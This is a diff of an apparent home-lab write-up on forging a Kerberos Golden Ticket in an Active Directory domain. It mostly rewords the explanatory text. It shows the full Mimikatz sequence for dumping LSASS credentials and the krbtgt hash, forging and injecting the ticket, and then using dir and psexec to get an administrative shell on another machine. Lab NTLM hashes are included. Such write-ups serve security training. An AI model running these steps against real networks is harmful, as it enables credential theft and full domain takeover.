@@ -14,7 +14,6 @@
 * [Lab Setup](#lab-setup)
 * [Tools Used](#tools-used)
 * [Prerequisites](#prerequisites)
-* [What I Understood During the Process](#what-i-understood-during-the-process)
 * [Step 1 — Downloading Mimikatz in Kali](#step-1--downloading-mimikatz-in-kali)
 * [Step 2 — Running Mimikatz on the DC](#step-2--running-mimikatz-on-the-dc)
 * [Step 3 — Dumping Credentials from Memory](#step-3--dumping-credentials-from-memory)
@@ -95,11 +94,12 @@ Since the forged ticket is signed with the correct `krbtgt` hash, the Domain Con
 
 ## Step 1 — Downloading Mimikatz in Kali
 
-First I downloaded `mimikatz_trunk.zip` from GitHub on my Kali machine, then transferred it to the Domain Controller. After that I unzipped it on the DC.
+First, I downloaded `mimikatz_trunk.zip` from GitHub on my Kali machine, then copied it to the Domain Controller. After that, I extracted the zip file on the DC.
+
 
 ## Step 2 — Running Mimikatz on the DC
 
-After that I opened CMD on the DC. Since `mimikatz.exe` was sitting in my Downloads folder, I navigated to that directory and ran it from there.
+After that, I opened CMD on the DC. Since `mimikatz.exe` was in my Downloads folder, I moved to that directory and ran it.
 
 ```bash
 C:\Users\Administrator\Downloads>mimikatz.exe
@@ -127,19 +127,19 @@ mimikatz # privilege::debug
 Privilege '20' OK
 ```
 
-`Privilege '20' OK` means Mimikatz successfully got **SeDebugPrivilege** — this allows it to access memory of other processes including LSASS which holds all the credentials.
+`Privilege '20' OK` means Mimikatz successfully enabled **SeDebugPrivilege**. This privilege allows Mimikatz to access protected processes like LSASS, which handles authentication information on Windows.
 
-LSASS stands for Local Security Authority Subsystem Service.
-When log into Windows, LSASS:
+LSASS stands for **Local Security Authority Subsystem Service**.
+When a user logs into Windows, LSASS:
 
 - Verifies username and password
 - Checks credentials against local accounts or Active Directory
-- Creates access token (identity + permissions in the system)
-- Enforces security policies (like password rules, login restrictions)
+- Creates access tokens for users
+- Applies security policies
 
 ## Step 3 — Dumping Credentials from Memory
 
-Now I need Domain SID and krbtgt NTLM Hash.
+Now I need the Domain SID and user credential information from the Domain Controller.
 
 ```bash
 mimikatz # sekurlsa::logonpasswords
@@ -173,7 +173,7 @@ SID               : S-1-5-21-2745015721-426968701-4006811760-500
 | `Administrator` | `READTEAMBD` | `fc525c9683e8fe067095ba2ddc971889` |
 | `REDTEAMBD-DC$` | `READTEAMBD` | `5d61398d1bb36494251624d87522d005` |
 
-Got the Administrator NTLM hash sitting right in memory. No cracking needed — I can use this directly for Pass the Hash.
+The Administrator NTLM hash was recovered from memory. This hash can be used for authentication without knowing the original password.
 
 <p align="center">
   <img src="/Active-Directory/08-golden ticket/images/step3.png" width="600">
@@ -192,7 +192,9 @@ mimikatz # lsadump::lsa /inject /name:krbtgt
 | `/inject`      | Injects into the LSASS process to extract data            |
 | `/name:krbtgt` | Targets specifically the `krbtgt` account                 |
 
-Instead of dumping all accounts like `lsadump::lsa /patch`, this command goes after one specific account — `krbtgt`. This is the account I need to forge a Golden Ticket. It gives me the NTLM hash and the domain SID in one shot.
+Instead of dumping information from all accounts, this command targets only the `krbtgt` account. The `krbtgt` hash is required to create a Golden Ticket.
+
+This command also provides the Domain SID, which is needed when generating the ticket.
 
 <p align="center">
   <img src="/Active-Directory/08-golden ticket/images/step4.png" width="600">
@@ -215,7 +217,7 @@ kerberos::golden /user:Administrator /domain:readteambd.local /sid:S-1-5-21-2745
 | `/id` | `500` | RID of Administrator account — 500 is always the built-in Administrator |
 | `/ptt` | — | Pass the Ticket — injects the forged ticket directly into memory instead of saving to a file |
 
-I used `/ptt` here so the ticket gets loaded into my session immediately — no need to load it manually afterwards.
+I used `/ptt` so the generated ticket was loaded into the current session immediately. This allowed the session to use the forged ticket for authentication without loading it manually.
 
 **Output:**
 
@@ -247,8 +249,9 @@ Golden ticket for 'Administrator @ readteambd.local' successfully submitted for 
 ```bash
 mimikatz # misc::cmd
 ```
+After injecting the Golden Ticket using `/ptt`, I used `misc::cmd` to open a new CMD shell with the current ticket session.
 
-After injecting the Golden Ticket with `/ptt`, I ran `misc::cmd` to open a new CMD shell that carries the forged ticket in its session. Any command I run inside that shell will use the Golden Ticket for authentication — meaning I have full Domain Admin access across the entire domain.
+Any command executed inside this CMD shell will use the injected Kerberos ticket for authentication. Since the ticket was created with Domain Admin privileges, I can access domain resources with administrative rights.
 
 ## Step 7 — Accessing Victim Machine File System
 
@@ -286,8 +289,9 @@ dir \\192.168.5.142\c$
 </p>
 
 **What This Proves**
+If this command returns the contents of the C drive, it shows that the Golden Ticket was accepted by the target machine.
 
-If this command returns the contents of the C drive, it means the Golden Ticket worked. I am accessing another machine in the domain as Domain Administrator — without ever using a real password. Just the forged ticket was enough to get in.
+I was able to access another machine in the domain with Domain Administrator privileges without using a real password. The forged Kerberos ticket was enough to authenticate successfully.
 
 ## Step 8 — Getting a Shell on the Victim Machine
 
@@ -304,7 +308,7 @@ psexec \\192.168.5.142 cmd.exe
 | `cmd.exe` | Opens a CMD shell on that machine |
 
 
-After the Golden Ticket was loaded into my session, I used PSExec to get a full interactive CMD shell on the victim machine at `192.168.5.142` — no password, no credentials, just the forged ticket doing all the work.
+After the Golden Ticket was loaded into my session, I used PSExec to get a full interactive CMD shell on the victim machine at `192.168.5.142`. No password, no credentials, just the forged ticket doing all the work.
 
 **Output:**
 
@@ -329,12 +333,11 @@ Golden Ticket injected into session
           ↓
 Used ticket to authenticate to victim machine
           ↓
-Got a full CMD shell as Domain Admin
+Accessed the machine remotely using PSExec
           ↓
-Complete control over the victim machine
+Obtained an administrative CMD shell
 ```
-
-This is the final proof that the Golden Ticket attack worked from end to end — I moved from the Domain Controller all the way into a victim machine using nothing but a forged Kerberos ticket.
+This confirms that the Golden Ticket attack worked successfully. I moved from the Domain Controller to another machine in the domain using a forged Kerberos ticket instead of a real user password.
 
 ## How Defenders Can Catch This
 
